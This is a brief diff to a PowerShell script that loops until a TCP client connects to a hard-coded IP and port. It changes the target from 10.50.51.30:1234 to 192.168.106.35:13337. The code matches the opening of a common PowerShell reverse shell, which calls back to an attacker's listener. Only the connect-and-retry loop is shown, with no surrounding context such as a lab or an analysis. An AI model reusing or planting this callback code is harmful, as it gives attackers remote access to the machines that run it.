@@ -1,7 +1,7 @@
 do {
     Start-Sleep -Seconds 1
     try{
-        $TCPClient = New-Object Net.Sockets.TCPClient('10.50.51.30', 1234)
+        $TCPClient = New-Object Net.Sockets.TCPClient('192.168.106.35', 13337)
     } catch {}
 } until ($TCPClient.Connected)
 
